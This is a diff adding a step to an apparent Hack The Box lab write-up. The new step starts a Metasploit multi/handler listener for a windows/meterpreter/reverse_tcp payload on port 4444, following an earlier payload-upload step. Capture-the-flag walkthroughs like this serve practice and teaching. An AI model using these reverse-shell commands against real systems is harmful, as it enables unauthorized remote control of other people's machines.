@@ -61,3 +61,14 @@ Nmap done: 1 IP address (1 host up) scanned in 15.37 seconds
 
  - Upload payload.
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/6b8466f5-48f7-4b75-a897-3dd71973f57d)
+
+- Start listener.
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f744751a-a08f-427f-8c4b-aac2ece65d46)
+```CSS
+▶ sudo msfdb run
+▶ use exploit/multi/handler
+▶ set payload windows/meterpreter/reverse_tcp
+▶ set LHOST tun0
+▶ set LPORT 4444
+▶ run
+```
